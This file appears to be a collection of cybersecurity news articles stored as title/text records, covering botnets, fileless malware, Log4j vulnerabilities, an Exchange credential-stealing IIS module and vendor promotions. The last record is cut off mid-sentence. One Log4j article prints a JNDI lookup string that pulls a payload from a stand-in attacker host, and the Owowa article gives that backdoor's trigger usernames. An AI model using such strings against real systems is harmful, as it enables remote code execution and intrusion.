Line\nAt the end of the day, the best way to avoid falling victim to a tech support scam is to know that no company – not Microsoft, Apple, or anyone else – is ever going to call you or create a popup asking you to call them. Neither will any reputable antivirus vendor. In other words, if something were to go wrong on your computer for real, you’d likely be the only one to notice it.\nBut tech support scams rely on the chance that they may catch even a savvy user in a vulnerable moment. So it’s worth deploying the technologies listed here anyway to stay safe. Together, they prevent many of the attack vectors scammers use to trick you and keep your computer running virus and malware-free at all times. And while there’s no bulletproof solution available, being prepared is better than not.\n\n\nFound this article interesting?

{'title': 'New Phorpiex Botnet Variant Steals Half a Million Dollars in Cryptocurrency',
'text': 'Cryptocurrency users in Ethiopia, Nigeria, India, Guatemala, and the Philippines are being targeted by a new variant of the Phorpiex botnet called Twizt that has resulted in the theft of virtual coins amounting to $500,000 over the last one year.\nIsraeli security firm Check Point Research, which detailed the attacks, said the latest evolutionary version “enables the botnet to operate successfully without active [command-and-control] servers,“ adding it supports no less than 35 wallets associated with different blockchains, including Bitcoin, Ethereum, Dash, Dogecoin, Litecoin, Monero, Ripple, and Zilliqa, to facilitate crypto theft.\nPhorpiex, otherwise known as Trik, is known for its sextortion spam and ransomware campaigns as well as cryptojacking, a scheme that leverages the targets’ devices such as computers, smartphones, and servers to secretly mine cryptocurrency without their consent or knowledge.\n\nIt’s also infamous for its use of a technique called cryptocurrency clipping, which involves stealing cryptocurrency in the process of a transaction by deploying malware that automatically substitutes the intended wallet address with the threat actor’s wallet address. Check Point said it identified 60 unique Bitcoin wallets and 37 Ethereum wallets used by Phorpiex.\n\nWhile the botnet operators shut down and put its source code for sale on a dark web cybercrime forum in August 2021, the command-and-control (C&C) servers resurfaced a mere two weeks later to distribute Twizt, a previously undiscovered payload that can deploy additional malware and function in peer-to-peer mode, thus eliminating the need for a centralized C&C server.\n\nThe clipping feature also comes with an added advantage in that, once deployed, it can work even in the absence of any C&C servers and siphon money from victims’ wallets. “This means that each of the infected computers can act as a server and send commands to other bots in a chain,“ Check Point’s Alexey Bukhteyev said in a report. “The emergence of such features suggests that the botnet may become even more stable and therefore, more dangerous.“\n\nPhorpiex-infected bots have been spotted in 96 countries, topped by Ethiopia, Nigeria, and India. The botnet is also estimated to have hijacked roughly 3,000 transactions with a total value of approximately 38 Bitcoin and 133 Ether. It’s, however, worth noting that the botnet is designed to halt its execution should the infected system’s locale be defaulted to Ukraine, suggesting that the botnet operators are from the East European nation.\n“Malware with the functionality of a worm or a virus can continue to spread autonomously for a long time without any further involvement by its creators,“ Bukhteyev said. “In the past year, Phorpiex received a significant update that transformed it into a peer-to-peer botnet, allowing it to be managed without having a centralized infrastructure. The C&C servers can now change their IP addresses and issue commands, hiding among the botnet victims.“\n\n\nFound this article interesting?

{'title': 'Researchers Uncover New Coexistence Attacks On Wi-Fi and Bluetooth Chips',
'text': 'Cybersecurity researchers have demonstrated a new attack technique that makes it possible to leverage a device’s Bluetooth component to directly extract network passwords and manipulate traffic on a Wi-Fi chip, putting billions of electronic devices at risk of stealthy attacks.\nThe novel attacks work against the so-called “combo chips,“ which are specialized chips that are equipped to handle different types of radio wave-based wireless communications, such as Wi-Fi, Bluetooth, and LTE.\n“We provide empirical evidence that coexistence, i.e., the coordination of cross-technology wireless transmissions, is an unexplored attack surface,“ a group of researchers from the Technical University of Darmstadt’s Secure Mobile Networking Lab and the University of Brescia said in a new paper.\n“Instead of escalating directly into the mobile [operating system], wireless chips can escalate their privileges into other wireless chips by exploiting the same mechanisms they use to arbitrate their access to the resources they share, i.e., the transmitting antenna and the wireless medium.“\n\nCoexistence refers to a mechanism wherein Bluetooth, Wi-Fi, and LTE share the same components and resources — e.g., antenna or wireless spectrum — necessitating that these communication standards coordinate the spectrum access to avoid collisions when operating in the same frequency. Chipset vendors use this principle to allow Wi-Fi and Bluetooth to operate virtually concurrently.\n\nWhile these combo wireless chips are key to high-performance spectrum sharing, coexistence interfaces also pose a side-channel risk as demonstrated by the same set of researchers at the Black Hat security conference last year, effectively permitting a malicious party to glean details from other wireless technologies supported by the combo chip.\nDubbed “Spectra,“ the vulnerability class banks on the fact that transmissions happen in the same spectrum and wireless chips need to arbitrate the channel access. This breaks the separation between Wi-Fi and Bluetooth to result in denial-of-service on spectrum access, information disclosure, and even enable lateral privilege escalations from a Bluetooth chip to code execution on a Wi-Fi chip.\n“The Wi-Fi chip encrypts network traffic and holds the current Wi-Fi credentials, thereby providing the attacker with further information,“ the researchers said. “Moreover, an attacker can execute code on a Wi-Fi chip even if it is not connected to a wireless network.“\nIn addition, the researchers found that it’s possible for an adversary with control over the Wi-Fi core to observe Bluetooth packets, which, in turn, allows determining keystroke timings on Bluetooth keyboards, ultimately granting the attacker the ability to reconstruct text entered using the keyboard.\n\nSome of the attack scenarios were first reported to the impacted vendors as early as August 2019, but the coexistence flaws continue to remain unpatched on Broadcom SoCs to date.\n“As of November 2021, more than two years after reporting the first coexistence bug, coexistence attacks, including code execution, still work on up-to-date Broadcom chips,“ the academics said. “This highlights how hard these issues are to fix in practice.“\nTo minimize the risk of such wireless attacks, it’s recommended that users remove unnecessary Bluetooth pairings, delete unused Wi-Fi networks, and restrict to using cellular instead of Wi-Fi at public spaces.\n“Cellular data plans got more affordable during recent years and cellular network coverage increased,“ the researchers concluded. “Disabling Wi-Fi by default and only enabling it when using trusted networks can be considered a good security practice, even if cumbersome.“\n\n\nFound this article interesting?

{'title': 'The Guide to Automating Security Training for Lean Security Teams',
'text': 'Cyber threats used to be less threatening. While nobody wants their customers’ credit card numbers stolen in a data breach, or to see a deranged manifesto plastered over their company website, such incidents can almost seem quaint compared to ransomware attacks that bring all of your critical information systems to a dead halt.\nThe frequency of these attacks increased more than 150% in the U.S. last year, and in 2021 their global cost is expected to reach $20 billion. Effective, comprehensive security training is essential to mitigating these threats, many of which originate with low-profile phishing or malware attacks to get a foot in the door—attacks that can target anyone who works in your organization.\nA company’s employees are the front line of defense against cyberattacks, and canned training videos and short quizzes are rarely sufficient to prepare them for this responsibility. The trouble with good training is that it takes not just expertise but time and other resources. Companies that are trying to maximize efficiency and minimize costs sometimes struggle with delivering security training commensurate with the threats they’re actually facing. \nAccording to Gartner®, many resource-constrained organizations, specifically midsize enterprises, struggle to provide even basic security awareness training to their users, let alone develop a sophisticated, multichannel, context-specific, and employee-centric enterprise security awareness program.*\nOne way to overcome this challenge without hiring professional services or leaning harder on your existing IT staff is to employ automation in security training.\nWhat is Training Automation?\nThough the word “automation“ was not coined until 1947 by Ford Motor Company to describe the use of automatic devices in the company’s production lines, today it is one of the most widely used terms in the tech industry. As a buzzword, “automation“ really gets around. It suggests a solution that will handle your problems without requiring you to constantly monitor and futz with it, but in a very technical sense, every software program ever written involves some element of automation. Say you’ve got a security training solution that performs some tasks automatically, like sending out training reminders or test emails on a preset schedule. Is this training automation?\nNot in any meaningful sense. It’s just doing the bare minimum of what any training software should do, and in that sense is about as automated—and intelligent—as an alarm clock. True automation needs to be about more than just putting tasks on a timer.\nAdaptive, Hands-On Training Makes All the Difference\nIf you’re rolling out an upgrade to your Accounts Payable software, you can get away with herding everybody into a room, making them watch a video about it, and handing out a quiz afterward to make sure they were paying attention. When the purpose of the training is to prevent data breaches, ransomware attacks, and other serious threats, this isn’t enough.\nThe better solution is hands-on training that provides practice on what to do when an actual cyberattack manifests, and ideally, it will also take into account the knowledge level and behavioral profile of the individual receiving the training. Savvy users might benefit from being educated and tested on subtle, novel approaches, while some users are just “serial clickers“ who might need to retake Phishing 101 a few times before they unlearn their bad habits.\nOf course, that assumes you know which users are which—and automation can help you figure that out by engaging in continuous data analysis as users work their way through the training program.\nSemi-automated solutions can compensate for their shortcomings by offering lots of manual configuration options, but the time it takes to set these up correctly reduces the potential gains in efficiency, especially when things start scaling up. The path to real optimization always runs through true automation, which is essential for making training scalable. Only then can you optimize to achieve efficiency at scale.\nImage credit: CybeReady\nHow to Use Automation in Cybersecurity Training to Minimize Risk\nEvery organization has ’High-Risk Employees’ who jeopardize its stability. We’ve found that one out of every five people within an organization may fall under this high-risk category. They might be absolute rock star employees in every other sense, but for some reason, they’re just compelled to click the links in weird emails that they shouldn’t even have opened. Maybe it’s something about the way they’re wired, but usually, training and education are huge factors. These employees just lack the awareness of how dangerous phishing attacks can be and how to identify them reliably.\nThese are the people who need security training the most, and they need it to be effective. \nCybeReady’s solution for this is a fully-automated platform, powered by machine learning technology, which mitigates the risks from human error through an educational approach that provides frequent, adaptive, engaging training on a continuous basis.\nFor security teams that run lean, the complexity required to run such a training program is almost impossible to implement without a truly automated solution that has expert knowledge baked into the software.\nCybeReady works by following a continuous training methodology that generates enough data to differentiate between users who occasionally get taken in by phishing emails and those who habitually click on dangerous links. The latter group requires a little extra care and attention, and by segmenting trainees according to their risk level, you can deliver targeted training that meets the trainee at their precise level of knowledge and educates them with individualized lessons and simulations that decrease their risky behaviors.\n\nHere are a few of the principles CybeReady deploys to achieve measurable training progress:\nJust-in-Time Learning: When an employee clicks on a malicious email, CybeReady seizes the “golden moment“ to push a pop-up learning page that points out the red flags they missed.Timely Reminders: To reinforce the training and help them outgrow their bad habits, high-risk employees are sent reminders at strategic intervals.Adaptive Difficulty Levels: Some simulated phishing emails are obvious and easy to spot, others are very sneaky. Evaluations of past performance can be used to select simulations that will provide just the right level of challenge for the recipient. Adjusted Learning Frequency: High-risk employees receive simulated phishing emails more frequently. When they get better at identifying them and can be moved back down to a lower risk category, the frequency is adjusted back to normal levels.\nFinal Thoughts\nIn today’s threat environment, strong cybersecurity is critical. True automation in your security training systems can significantly bolster your defenses by efficiently marshaling resources toward the employees at the highest risk for falling victim to a cyberattack, without requiring you to hire a professional training team or force your IT staff to become teachers on the side.\nCybeReady’s machine learning solution has the expertise, analytics, and training methodologies built right in, so when the hackers and phishers start showing up you can feel confident that they won’t find any easy targets amongst a staff armed with knowledge from a state-of-the-art, data-driven, fully adaptive, and truly automated training program.\nGet started with CybeReady’s training program, tailored for lean security teams\n*Source: Gartner, “Market Guide for Security Awareness Computer-Based Training,“ Richard Addiscott, Claude Mandy, William Candrick, 26 July 2021.

{'title': 'New Fileless Malware Uses Windows Registry as Storage to Evade Detection',
'text': 'A new JavaScript-based remote access Trojan (RAT) propagated via a social engineering campaign has been observed employing sneaky “fileless“ techniques as part of its detection-evasion methods to elude discovery and analysis.\nDubbed DarkWatchman by researchers from Prevailion’s Adversarial Counterintelligence Team (PACT), the malware uses a resilient domain generation algorithm (DGA) to identify its command-and-control (C2) infrastructure and utilizes the Windows Registry for all of its storage operations, thereby enabling it to bypass antimalware engines.\nThe RAT “utilizes novel methods for fileless persistence, on-system activity, and dynamic run-time capabilities like self-updating and recompilation,“ researchers Matt Stafford and Sherman Smith said, adding it “represents an evolution in fileless malware techniques, as it uses the registry for nearly all temporary and permanent storage and therefore never writes anything to disk, allowing it to operate beneath or around the detection threshold of most security tools.“\n\nPrevailion said that an unnamed enterprise-sized organization in Russia was one among the targeted victims, with a number of malware artifacts identified starting November 12, 2021. Given its backdoor and persistence features, the PACT team assessed that DarkWatchman could be an initial access and reconnaissance tool for use by ransomware groups.\nAn interesting consequence of this novel development is that it completely obviates the need for ransomware operators to recruit affiliates, who are typically in charge of dropping the file-locking malware and handling the file exfiltration. Using DarkWatchman as a prelude for ransomware deployments also equips the core developers of the ransomware with better oversight over the operation beyond negotiating ransoms.\n\nDistributed via spear-phishing emails that masquerade as “Free storage expiration notification“ for a consignment delivered by Russian shipment company Pony Express, DarkWatchman provides a stealthy gateway for further malicious activity. The emails come attached with a purported invoice in the form of a ZIP archive that, in turn, contains the payload necessary to infect the Windows system. \nThe novel RAT is both a fileless JavaScript RAT and a C#-based keylogger, the latter of which is stored in the registry to avoid detection. Both the components are also extremely lightweight. The malicious JavaScript code just takes about 32kb, while the keylogger barely registers at 8.5kb.\n“The storage of the binary in the registry as encoded text means that DarkWatchman is persistent yet its executable is never (permanently) written to disk; it also means that DarkWatchman’s operators can update (or replace) the malware every time it’s executed,“ the researchers said.\n\nOnce installed, DarkWatchman can execute arbitrary binaries, load DLL files, run JavaScript code and PowerShell commands, upload files to a remote server, update itself, and even uninstall the RAT and keylogger from the compromised machine. The JavaScript routine is also responsible for establishing persistence by creating a scheduled task that runs the malware at every user log on.\n“The keylogger itself does not communicate with the C2 or write to disk,“ the researchers said. “Instead, it writes its keylog to a registry key that it uses as a buffer. During its operation, the RAT scrapes and clears this buffer before transmitting the logged keystrokes to the C2 server.“\nDarkWatchman has yet to be attributed to a hacking group, but Prevailion characterized the crew as a “capable threat actor,“ alongside pointing out the malware’s exclusive targeting of victims located in Russia and the typographical errors and misspellings that were identified in the source code samples, raising the possibility that the operators may not be native English speakers. \n“It would appear that the authors of DarkWatchman identified and took advantage of the complexity and opacity of the Windows Registry to work underneath or around the detection threshold of security tools and analysts alike,“ the researchers concluded. “Registry changes are commonplace, and it can be difficult to identify which changes are anomalous or outside the scope of normal OS and software functions.“\n\n\nFound this article interesting?

{'title': 'Hackers Begin Exploiting Second Log4j Vulnerability as a Third Flaw Emerges',
'text': 'Web infrastructure company Cloudflare on Wednesday revealed that threat actors are actively attempting to exploit a second bug disclosed in the widely used Log4j logging utility, making it imperative that customers move quickly to install the latest version as a barrage of attacks continues to pummel unpatched systems with a variety of malware.\nThe new vulnerability, assigned the identifier CVE-2021-45046, makes it possible for adversaries to carry out denial-of-service (DoS) attacks and follows disclosure from the Apache Software Foundation (ASF) that the original fix for the remote code execution bug — CVE-2021-44228 aka Log4Shell — was “incomplete in certain non-default configurations.“ The issue has since been addressed in Log4j version 2.16.0.\n“This vulnerability is actively being exploited and anyone using Log4j should update to version 2.16.0 as soon as possible, even if you have previously updated to 2.15.0,“ Cloudflare’s Andre Bluehs and Gabriel Gabor said.\n\nEven more troublingly, researchers at security firm Praetorian warned of a third separate security weakness in Log4j version 2.15.0 that can “allow for exfiltration of sensitive data in certain circumstances.“ Additional technical details of the flaw have been withheld to prevent further exploitation, but it’s not immediately clear if this has been already addressed in version 2.16.0.\n“2.16 disables JNDI lookups by default and — as a result — is the safest version of Log4j2 that we’re aware of,“ Anthony Weems, principal security engineer at Praetorian, told The Hacker News. When reached for a response, the Apache Logging Services Project Management Committee (PMC) confirmed that “We have been in contact with the engineer from Praetorian to fully understand the nature and scope of the problem.“\nThe latest development comes as advanced persistent threat groups from China, Iran, North Korea, and Turkey, counting the likes of Hafnium and Phosphorus, have jumped into the fray to operationalize the vulnerability and discover and continue exploiting as many susceptible systems as possible for follow-on attacks. Over 1.8 million attempts to exploit the Log4j vulnerability have been recorded so far.\n\nMicrosoft Threat Intelligence Center (MSTIC) said it also observed access brokers leveraging the Log4Shell flaw to gain initial access to target networks that were then sold to other ransomware affiliates. In addition, dozens of malware families that run the gamut from cryptocurrency coin miners and remote access trojans to botnets and web shells have been identified taking advantage of this shortcoming to date.\n\nWhile it’s common for threat actors to make efforts to exploit newly disclosed vulnerabilities before they’re remediated, the Log4j flaw underscores the risks arising from software supply chains when a key piece of software is used within a broad range of products across several vendors and deployed by their customers around the world.\n“This cross-cutting vulnerability, which is vendor-agnostic and affects both proprietary and open-source software, will leave a wide swathe of industries exposed to remote exploitation, including electric power, water, food and beverage, manufacturing, transportation, and more,“ industrial cybersecurity firm Dragos noted.\n“As network defenders close off more simplistic exploit paths and advanced adversaries incorporate the vulnerability in their attacks, more sophisticated variations of Log4j exploits will emerge with a higher likelihood of directly impacting Operational Technology networks,“ the company added.\n\n\nFound this article interesting?

'text': 'Meta Platforms, the company formerly known as Facebook, has announced that it’s expanding its bug bounty program to start rewarding valid reports of scraping vulnerabilities across its platforms as well as include reports of scraping data sets that are available online.\n“We know that automated activity designed to scrape people’s public and private data targets every website or service,“ said Dan Gurfinkel, security engineering manager at Meta. “We also know that it is a highly adversarial space where scrapers — be it malicious apps, websites or scripts — constantly adapt their tactics to evade detection in response to the defenses we build and improve.“\n\nTo that end, the social media giant aims to monetarily compensate for valid reports of scraping bugs in its service and identify unprotected or openly public databases containing no less than 100,000 unique Facebook user records with personally identifiable information (PII) such as email, phone number, physical address, religious, or political affiliation. The only caveat is that the reported data set must be unique and not previously known.\nShould the requisite criteria be met, the company said it will take appropriate measures, including legal actions, to remove the data from the non-Meta website. This could also involve reaching out to hosting providers like Amazon, Box, and Dropbox to pull the data set offline, or working with third-party app developers to address server misconfigurations. Reports concerning scraped databases will be rewarded through matched charity donations of the researchers’ choosing.\n“Our goal is to quickly identify and counter scenarios that might make scraping less costly for malicious actors to execute,“ Gurfinkel noted, adding “we want to particularly encourage research into logic bypass issues that can allow access to information via unintended mechanisms, even if proper rate limits exist.“\n\nThe move to curb unauthorized scraping, a technique referring to the practice of extracting data from websites, comes as part of the company’s efforts to limit abuse of people’s data on its platform in the wake of the infamous Cambridge Analytica data scandal that resulted in the personal information belonging to millions of Facebook users harvested without their consent for political advertising.\nThat’s not all. Earlier this April, the phone numbers of 533 million Facebook users were shared on a cybercrime forum for free, data that was collected by scraping the platform. In October 2021, Meta filed a lawsuit on Friday against a Ukrainian national named Alexander Alexandrovich Solonchenko for allegedly scraping and selling the personal data of more than 178 million Facebook users on an underground forum.\nThe company said it has paid out over $14 million in bounties since the inception of the program in 2011, with $2.3 million awarded to researchers from more than 46 countries this year alone. Most of the valid reports over the past 10 years have come from India, the U.S., and Nepal, Meta pointed out.\n\n\nFound this article interesting?

'text': 'Today’s cyber attackers are constantly looking for ways to exploit vulnerabilities and infiltrate organizations. To keep up with this evolving threat landscape, security teams must be on the lookout for potential risks around the clock. Since most organizations simply cannot afford to have 24x7 security teams, managed detection and response (MDR) services have become a critical aspect of any modern security stack. \nMost organizations must find outsourced MDR providers on top of their existing solutions, but that’s not always a feasible solution. XDR provider Cynet offers its MDR service (learn more here), which the company calls CyOps, as part of its offering. The service is much more than simply a help desk, though.\nCyOps offers a thorough MDR service that offers both monitoring and threat hunting, as well as incident response in cases where an attack is successful. \nHow CyOps operates\nThe key selling point for CyOps MDR is that it enhances organizations’ security around the clock. The CyOps team is available 24x7x365 and is constantly monitoring customers’ environments for any risk. CyOps offers five key services:\nDetectionInvestigationResponseExpert advice Research reports\nDetection\nThe CyOps team builds on the tools offered by Cynet 360, and helps ensure that real threats aren’t overlooked, and that they can be met with a response whenever they must. The CyOps team is available 24x7, and manages alerts, events, inquiries, and any incidents that may arise. They also offer alert analysis based on alerts generated by the platform itself.\nThe team also acts proactively when they detect a threat, contacting organizations if they’re at risk. This outreach includes any internal activities that might suggest a threat, suspicious activities, and malicious activities.\nThe team also engages in threat hunting and threat intelligence to be prepared for unexpected attacks and new vulnerabilities. \nInvestigation \nWhen users detect something suspicious in their endpoints or networks, they can reach out to CyOps for an investigation of the suspicious materials. The CyOps team also performs attack investigations to understand the scope and impact, as well as updating their indicators of compromise (IOCs). \nResponse\nUsers also receive support when they suffer a breach or attack. Customers can use the Cynet 360 platform to respond to attacks but can also call on CyOps to assist in more complex remediations and even threat response. CyOps provides both remediation instructions and generates custom remediation playbooks that can be implemented directly from the Cynet 360 platform. \nExpert advice and Research reports\nThe MDR service is also available to answer any inquiries, doubts, or suspicions customers might have about an attack. Users can reach out to the CyOps team with questions about potential attacks, suspicious files and activities, alerts, and other potential IOCs. \nOn top of that, CyOps continously updates and publishes new research about attacks, vulnerabilities, new techniques, exploits, and other threats that could impact its customers.

{'title': 'Hackers Using Malicious IIS Server Module to Steal Microsoft Exchange Credentials',
'text': 'Malicious actors are deploying a previously undiscovered binary, an Internet Information Services (IIS) webserver module dubbed “Owowa,“ on Microsoft Exchange Outlook Web Access servers with the goal of stealing credentials and enabling remote command execution.\n“Owowa is a C#-developed .NET v4.0 assembly that is intended to be loaded as a module within an IIS web server that also exposes Exchange’s Outlook Web Access (OWA),“ Kaspersky researchers Paul Rascagneres and Pierre Delcher said. “When loaded this way, Owowa will steal credentials that are entered by any user in the OWA login page, and will allow a remote operator to run commands on the underlying server.“\nThe idea that a rogue IIS module can be fashioned as a backdoor is not new. In August 2021, an exhaustive study of the IIS threat landscape by Slovak cybersecurity company ESET revealed as many as 14 malware families that were developed as native IIS modules in an attempt to intercept HTTP traffic and remotely commandeer the compromised computers.\n\nAs a persistent component on the compromised system, Owawa is engineered to capture the credentials of users who are successfully authenticated on the OWA authentication web page. Exploitation can then be achieved by sending “seemingly innocuous requests“ to the exposed web services by entering specifically crafted commands within the username and password fields in the OWA authentication page of a compromised server.\nSpecifically, if the OWA username is “jFuLIXpzRdateYHoVwMlfc,“ Owawa responds back with the encrypted credentials. If the username, on the other hand, is “dEUM3jZXaDiob8BrqSy2PQO1“, the PowerShell command typed in the OWA password field is executed, the results of which are sent back to the attacker.\n\nThe Russian security firm said it detected a cluster of targets with compromised servers located in Malaysia, Mongolia, Indonesia, and the Philippines that primarily belong to government organizations, with the exception of one server that’s attached to a government-owned transportation company. That said, additional organizations in Europe are believed to have been victimized by the actor as well.\nAlthough no links have been unearthed between the Owowa operators and other publicly documented hacking groups, a username “S3crt“ (read “secret“) that was found embedded in the source code of the identified samples has yielded additional malware executables that are likely the work of the same developer. Chief among them are a number of binaries designed to execute an embedded shellcode, load next-stage malware retrieved from a remote server, and trigger the execution of Cobalt Strike payloads.\n\nKaspersky’s Global Research and Analysis Team (GReAT) also said it identified an account with the same username on Keybase, where the individual has shared offensive tools such as Cobalt Strike and Core Impact, in addition to demonstrating an interest in the latter on RAIDForums.\n“IIS modules are not a common format for backdoors, especially when compared to typical web application threats like web shells and can therefore easily be missed during standard file monitoring efforts,“ Rascagneres and Delcher said. “The malicious module […] represents an effective option for attackers to gain a strong foothold in targeted networks by persisting inside an Exchange server.“\n\n\nFound this article interesting?

'text': 'Microsoft has rolled out Patch Tuesday updates to address multiple security vulnerabilities in Windows and other software, including one actively exploited flaw that’s being abused to deliver Emotet, TrickBot, or Bazaloader malware payloads.\nThe latest monthly release for December fixes a total of 67 flaws, bringing the total number of bugs patched by the company this year to 887, according to the Zero Day Initiative. Seven of the 67 flaws are rated Critical and 60 are rated as Important in severity, with five of the issues publicly known at the time of release. It’s worth noting that this is in addition to the 21 flaws resolved in the Chromium-based Microsoft Edge browser.\nThe most critical of the lot is CVE-2021-43890 (CVSS score: 7.1), a Windows AppX installer spoofing vulnerability that Microsoft said could be exploited to achieve arbitrary code execution. The lower severity rating is indicative of the fact that code execution hinges on the logged-on user level, meaning “users whose accounts are configured to have fewer user rights on the system could be less impacted than users who operate with administrative user rights.“\nThe Redmond-based tech giant noted that an adversary could leverage the flaw by crafting a malicious attachment that’s then used as part of a phishing campaign to trick the recipients into opening the email attachment. Sophos security researchers Andrew Brandt as well as Rick Cole and Nick Carr of the Microsoft Threat Intelligence Center (MSTIC) have been credited with reporting the vulnerability.\n\n“Microsoft is aware of attacks that attempt to exploit this vulnerability by using specially crafted packages that include the malware family known as Emotet/ Trickbot/ Bazaloader,“ the company further added. The development comes as Emotet malware campaigns are witnessing a surge in activity after more than a 10-month-long hiatus following a coordinated law enforcement effort to disrupt the botnet’s reach.\nOther flaws that are publicly known are below —\nCVE-2021-43240 (CVSS score: 7.8) - NTFS Set Short Name Elevation of Privilege VulnerabilityCVE-2021-43883 (CVSS score: 7.8) - Windows Installer Elevation of Privilege VulnerabilityCVE-2021-41333 (CVSS score: 7.8) - Windows Print Spooler Elevation of Privilege VulnerabilityCVE-2021-43893 (CVSS score: 7.5) - Windows Encrypting File System (EFS) Elevation of Privilege VulnerabilityCVE-2021-43880 (CVSS score: 5.5) - Windows Mobile Device Management Elevation of Privilege Vulnerability\nThe December patch also comes with remediations for 10 remote code execution flaws in Defender for IoT, in addition to critical bugs affecting iSNS Server (CVE-2021-43215), 4K Wireless Display Adapter (CVE-2021-43899), Visual Studio Code WSL Extension (CVE-2021-43907), Office app (CVE-2021-43905), Windows Encrypting File System (CVE-2021-43217), Remote Desktop Client (CVE-2021-43233), and SharePoint Server (CVE-2021-42309).\n\nSoftware Patches From Other Vendors\nBesides Microsoft, security updates have also been released by other vendors to rectify several vulnerabilities, including —\nAdobeAndroidAppleCiscoCitrixIntelLinux distributions Oracle Linux, Red Hat, and SUSESAPSchneider Electric, andSiemens\nFurthermore, numerous security advisories have been released by dozens of companies for the actively exploited Log4j remote code execution vulnerability that could allow a complete takeover of affected systems.\n\n\nFound this article interesting?

{'title': 'Second Log4j Vulnerability (CVE-2021-45046) Discovered — New Patch Released',
'text': 'UPDATE — The severity score of CVE-2021-45046, originally classified as a DoS bug, has since been revised from 3.7 to 9.0, to reflect the fact that an attacker could abuse the vulnerability to send a specially crafted string that leads to “information leak and remote code execution in some environments and local code execution in all environments.“\nThe Apache Software Foundation (ASF) has pushed out a new fix for the Log4j logging utility after the previous patch for the recently disclosed Log4Shell exploit was deemed as “incomplete in certain non-default configurations.“\nThe second vulnerability — tracked as CVE-2021-45046 — is rated 3.7 out of a maximum of 10 on the CVSS rating system and affects all versions of Log4j from 2.0-beta9 through 2.12.1 and 2.13.0 through 2.15.0, which the project maintainers shipped last week to address a critical remote code execution vulnerability (CVE-2021-44228) that could be abused to infiltrate and take over systems.\nThe incomplete patch for CVE-2021-44228 could be abused to “craft malicious input data using a JNDI Lookup pattern resulting in a denial-of-service (DoS) attack,“ the ASF said in a new advisory. The latest version of Log4j, 2.16.0 (for users requiring Java 8 or later), all but removes support for message lookups and disables JNDI by default, the component that’s at the heart of the vulnerability. Users requiring Java 7 are recommended to upgrade to Log4j release 2.12.2 when it becomes available.\n“Dealing with CVE-2021-44228 has shown the JNDI has significant security issues,“ Ralph Goers of the ASF explained. “While we have mitigated what we are aware of it would be safer for users to completely disable it by default, especially since the large majority are unlikely to be using it.“\nJNDI, short for Java Naming and Directory Interface, is a Java API that enables applications coded in the programming language to look up data and resources such as LDAP servers. Log4Shell is resident in the Log4j library, an open-source, Java-based logging framework commonly incorporated into Apache web servers.\n\nThe issue itself occurs when the JNDI component of the LDAP connector is leveraged to inject a malicious LDAP request — something like “${jndi:ldap://attacker_controled_website/payload_to_be_executed}“ — that, when logged on a web server running the vulnerable version of the library, enables an adversary to retrieve a payload from a remote domain and execute it locally.\nThe latest update arrives as fallout from the flaw has resulted in a “true cyber pandemic,“ what with several threat actors seizing on Log4Shell in ways that lay the groundwork for further attacks, including deploying coin miners, remote access trojans, and ransomware on susceptible machines. The opportunistic intrusions are said to have commenced at least since December 1, although the bug became common knowledge on December 9.\nThe security flaw has sparked widespread alarm because it exists in a near-ubiquitously used logging framework in Java applications, presenting bad actors with an unprecedented gateway to penetrate and compromise millions of devices across the world.\nSpelling further trouble for organizations, the remotely exploitable flaw also impacts hundreds of major enterprise products from a number of companies such as Akamai, Amazon, Apache, Apereo, Atlassian, Broadcom, Cisco, Cloudera, ConnectWise, Debian, Docker, Fortinet, Google, IBM, Intel, Juniper Networks, Microsoft, Okta, Oracle, Red Hat, SolarWinds, SonicWall, Splunk, Ubuntu, VMware, Zscaler, and Zoho, posing a significant software supply chain risk.\n\n“Unlike other major cyberattacks that involve one or a limited number of software, Log4j is basically embedded in every Java based product or web service. It is very difficult to manually remediate it,“ Israeli security company Check Point said. “This vulnerability, because of the complexity in patching it and easiness to exploit, seems that it will stay with us for years to come, unless companies and services take immediate action to prevent the attacks on their products by implementing a protection.“\nIn the days after the bug was disclosed, at least ten different groups have jumped in on the exploit bandwagon and roughly 44% of corporate networks globally already have been under attack, marking a significant escalation of sorts. Furthermore, criminal gangs acting as access brokers have begun using the vulnerability to gain initial foothold into target networks and then sell the access to ransomware-as-a-service (RaaS) affiliates.\nThis also encompasses nation-state actors originating from China, Iran, North Korea, and Turkey, with Microsoft noting that the “activity ranges from experimentation during development, integration of the vulnerability to in-the-wild payload deployment, and exploitation against targets to achieve the actor’s objectives.“\nThe large-scale weaponization of the remote code execution flaw has prompted the U.S. Cybersecurity and Infrastructure Security Agency (CISA) to add Log4Shell to its Known Exploited Vulnerabilities Catalog, giving federal agencies a deadline of December 24 to incorporate patches for the vulnerability and urging vendors to “immediately identify, mitigate, and patch affected products using Log4j.“\nSean Gallagher, a senior threat researcher at Sophos, warned that “adversaries are likely grabbing as much access to whatever they can get right now with the view to monetize and/or capitalize on it later on,“ adding “there is a lull before the storm in terms of more nefarious activity from the Log4Shell vulnerability.“\n“The most immediate priority for defenders is to reduce exposure by patching and mitigating all corners of their infrastructure and investigate exposed and potentially compromised systems. This vulnerability can be everywhere,“ Gallagher added.\n\n\nFound this article interesting? Follow THN on Facebook, Twitter  and LinkedIn to read more exclusive content we post.',

{'title': 'Hackers Exploit Log4j Vulnerability to Infect Computers with Khonsari Ransomware',
'text': 'Romanian cybersecurity technology company Bitdefender on Monday revealed that attempts are being made to target Windows machines with a novel ransomware family called Khonsari as well as a remote access Trojan named Orcus by exploiting the recently disclosed critical Log4j vulnerability.\nThe attack leverages the remote code execution (RCE) flaw to download an additional payload, a .NET binary, from a remote server that encrypts all the files with the extension “.khonsari“ and displays a ransom note that urges the victims to make a Bitcoin payment in exchange for recovering access to the files.\nTracked as CVE-2021-44228, the RCE vulnerability is also known by the monikers “Log4Shell“ or “Logjam“ and impacts versions 2.0-beta9 to 2.14.1 of the software library. In simple terms, the bug could force an affected system to download malicious software, giving the attackers a digital beachhead on servers located within corporate networks.\n\nLog4j is an open-source Java library maintained by the nonprofit Apache Software Foundation. Amassing about 475,000 downloads from its GitHub project and adopted widely for application event logging, the utility is also a part of other frameworks, such as Elasticsearch, Kafka and Flink, that are used in many popular websites and services.\nThe disclosure comes as the U.S. Cybersecurity and Infrastructure Security Agency (CISA) sounded an alarm warning of active, widespread exploitation of the flaw that, if left unaddressed, could grant unfettered access and unleash a new round of cyber attacks, as fallout from the bug has left companies rushing to find and patch vulnerable machines.\n“An adversary can exploit this vulnerability by submitting a specially crafted request to a vulnerable system that causes that system to execute arbitrary code,“ the agency said in guidance issued Monday. “The request allows the adversary to take full control over the system. The adversary can then steal information, 